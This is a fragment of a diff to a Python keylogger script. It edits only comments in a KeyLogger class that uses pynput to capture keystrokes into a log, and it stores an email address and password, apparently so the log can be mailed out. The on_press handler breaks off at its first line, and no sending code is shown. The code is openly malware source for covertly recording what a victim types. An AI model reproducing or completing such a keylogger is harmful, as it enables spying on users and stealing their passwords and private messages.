@@ -6,11 +6,11 @@ import threading
 
 from pynput import keyboard
 
-# Create Keylogger Class
+
 
 class KeyLogger:
 
-    # Define __init__ variables
+ 
 
     def __init__(self, time_interval, email, password):
         self.interval = time_interval
@@ -18,12 +18,12 @@ class KeyLogger:
         self.email = email
         self.password = password
 
-    # Create Log which all keystrokes will be appended to
+    # Creating Log which all keystrokes will be appended to
 
     def append_to_log(self, string):
         self.log = self.log + string
 
-    # Create Keylogger
+    # actual pgm Keylogger
 
     def on_press(self, key):
         try:
